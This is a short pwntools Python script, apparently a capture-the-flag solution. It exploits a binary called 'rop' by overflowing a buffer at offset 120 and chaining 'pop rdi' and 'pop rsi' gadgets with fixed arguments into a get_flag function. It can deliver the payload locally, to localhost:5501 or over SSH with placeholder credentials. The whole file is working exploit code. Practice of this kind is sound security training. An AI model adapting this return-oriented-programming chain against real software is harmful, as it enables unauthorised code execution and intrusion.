#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/rop'

e = ELF('./build/rop')
rop = ROP('./build/rop')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5501)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/rop', cwd='problemDir')
else:
    p = e.process()

payload = flat({120: rop.find_gadget(['pop rdi','ret'])[0]}, 0xdeadbeef, rop.find_gadget(['pop rsi','ret'])[0], 0xcafebabe, e.sym['get_flag'])

p.sendline(payload)
p.interactive()
